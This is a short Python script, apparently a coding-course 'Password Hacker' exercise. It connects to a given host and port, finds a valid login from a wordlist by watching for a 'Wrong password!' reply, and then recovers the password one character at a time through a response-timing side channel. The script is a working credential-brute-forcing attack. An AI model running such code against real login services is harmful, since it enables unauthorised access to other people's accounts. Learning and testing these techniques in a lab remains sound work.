import argparse
import string
import socket
import json
import time


def find_login(client_socket):
    with open('C:/Users/Romek/Desktop/Password Hacker/logins.txt', 'r') as logins:
        logins = logins.read().split('\n')
        for login in logins:
            client_socket.send(json.dumps({'login': login, 'password': ' '}).encode())
            response = client_socket.recv(1024)
            response = json.loads(response.decode())
            if response['result'] == 'Wrong password!':
                return login


def find_password(client_socket, login):
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    password, try_password = '', ''
    while True:
        for char in chars:
            start = time.time()
            client_socket.send(json.dumps({'login': login, 'password': f'{try_password}{char}'}).encode())
            response = json.loads(client_socket.recv(1024).decode())
            end = time.time()
            if end - start >= 0.09:
                password += char
                try_password = password
            elif response['result'] == 'Connection success!':
                password += char
                return password


def connection(address):
    with socket.socket() as client_socket:
        client_socket.connect(address)
        login = find_login(client_socket)
        password = find_password(client_socket, login)
        print(json.dumps({'login': login, 'password': password}))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host')
    parser.add_argument('port')
    args = parser.parse_args()
    connection((args.host, int(args.port)))


if __name__ == '__main__':
    main()
